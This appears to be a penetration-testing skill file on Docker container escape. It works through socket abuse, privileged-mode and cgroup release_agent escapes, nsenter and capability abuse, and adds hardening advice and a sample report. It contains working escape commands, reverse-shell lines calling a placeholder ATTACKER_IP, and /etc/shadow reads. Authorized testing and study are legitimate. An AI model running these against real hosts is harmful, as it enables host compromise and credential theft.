---
name: docker-container-escape
description: >
  Escape from Docker containers to the host system using container misconfigurations, mounted sockets,
  privileged mode, capabilities abuse, and kernel exploits. Use this skill when testing containerized
  environments for breakout vulnerabilities during penetration tests. Covers Docker socket mounting,
  cgroup escapes, nsenter techniques, and Kubernetes pod escapes.
domain: cybersecurity
subdomain: penetration-testing
category: Infrastructure
difficulty: advanced
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0004]
  techniques: [T1610, T1611]
platforms: [linux]
tags: [docker, container-escape, container-security, kubernetes, privileged-container, pentest, breakout]
tools: [deepce, linpeas, amicontained, docker]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Docker Container Escape

## When to Use
- When you have shell access inside a Docker container during a pentest
- When testing Kubernetes pods for breakout vulnerabilities
- When assessing container security configurations
- When testing for privilege escalation from container to host


## Prerequisites
- Shell access (user or limited privilege) on the target system
- Enumeration tools appropriate for the target OS (LinPEAS, WinPEAS, etc.)
- Understanding of the target OS privilege model and common misconfigurations
- Ability to transfer files or compile tools on the target

## Workflow

### Phase 1: Container Detection & Enumeration

```bash
# Am I in a container?
cat /proc/1/cgroup 2>/dev/null | grep -i docker
ls -la /.dockerenv
hostname  # Container IDs look like hex strings: a1b2c3d4e5f6

# Automated detection
# amicontained — container introspection tool
./amicontained

# DeepCE — Docker Privilege Escalation scanner
./deepce.sh

# Check for mounted Docker socket (CRITICAL FINDING)
ls -la /var/run/docker.sock
ls -la /run/docker.sock

# Check capabilities
capsh --print
cat /proc/self/status | grep Cap

# Check if privileged
cat /proc/self/status | grep -i "seccomp\|cap"
# If CapEff: 0000003fffffffff → Privileged container!

# Check mounted volumes
mount | grep -v "proc\|sys\|dev\|overlay"
df -h
cat /proc/mounts
```

### Phase 2: Docker Socket Escape (Most Common)

```bash
# If /var/run/docker.sock is mounted — GAME OVER
# You can create a new privileged container with host filesystem mounted

# Method 1: Using Docker client inside container
# Install Docker CLI or use curl to API
docker -H unix:///var/run/docker.sock run -it --rm --privileged \
  -v /:/hostfs alpine:latest chroot /hostfs bash

# Method 2: Using curl (when Docker CLI is not available)
# List running containers
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq

# Create privileged container with host access
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "chroot /hostfs /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""],
    "HostConfig": {
      "Binds": ["/:/hostfs"],
      "Privileged": true
    }
  }'

# Start the container
curl -s --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/CONTAINER_ID/start
```

### Phase 3: Privileged Container Escape

```bash
# If the container is running in --privileged mode:

# Method 1: Mount host filesystem
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
ls /tmp/hostfs/  # You now have host filesystem access!
chroot /tmp/hostfs bash

# Method 2: cgroup escape (CVE-2022-0492)
# Create a cgroup with a release_agent pointing to host
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/escape
echo 1 > $d/escape/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > $d/escape/cgroup.procs"

# Method 3: nsenter to host PID namespace
nsenter -t 1 -m -u -i -n -p -- /bin/bash
# Requires: CAP_SYS_ADMIN or --pid=host
```

### Phase 4: Capability-based Escape

```bash
# CAP_SYS_ADMIN — most versatile capability
# Allows mount, cgroup manipulation, etc.
# Use cgroup escape method above

# CAP_SYS_PTRACE — process tracing
# Inject into host processes visible from container
# Works when --pid=host is set

# CAP_NET_ADMIN — network manipulation
# ARP spoof, route manipulation
# Pivot to host network services

# CAP_DAC_READ_SEARCH — read any file
# Read host files through /proc/1/root/
cat /proc/1/root/etc/passwd
cat /proc/1/root/etc/shadow
```

## 🔵 Blue Team Detection
- **Never mount Docker socket** into containers
- **Never use --privileged** unless absolutely necessary
- **Drop all capabilities**: `--cap-drop=ALL --cap-add=ONLY_NEEDED`
- **Use rootless containers**: Run Docker daemon as non-root
- **Seccomp profiles**: Apply restrictive seccomp profiles
- **AppArmor/SELinux**: Enforce MAC policies on containers
- **Read-only root fs**: `--read-only` flag

## Key Concepts
| Concept | Description |
|---------|-------------|
| Docker socket | Unix socket for Docker API — mounting it gives full Docker control |
| Privileged mode | Container with all capabilities and no seccomp — essentially root on host |
| cgroup escape | Using Linux cgroups release_agent mechanism to execute on host |
| nsenter | Enter namespaces of another process (e.g., PID 1 on host) |
| Capability | Fine-grained Linux permission — certain capabilities enable container escape |

## Output Format
```
Container Escape Report
========================
Container: web-app-prod (Docker 20.10.21)
Escape Method: Docker socket mounted inside container
Impact: Full host system compromise  

Evidence:
  $ ls -la /var/run/docker.sock
  srw-rw---- 1 root docker 0 /var/run/docker.sock
  
  $ docker -H unix:///var/run/docker.sock run --privileged -v /:/hostfs alpine cat /hostfs/etc/shadow
  root:$6$hash:19000:0:99999:7:::

Remediation:
1. Remove Docker socket mount from container configuration
2. Use rootless Docker mode
3. Apply seccomp and AppArmor profiles
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- HackTricks: [Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
- Docker: [Security Best Practices](https://docs.docker.com/engine/security/)
- DeepCE: [Container Escape Scanner](https://github.com/stealthcopter/deepce)
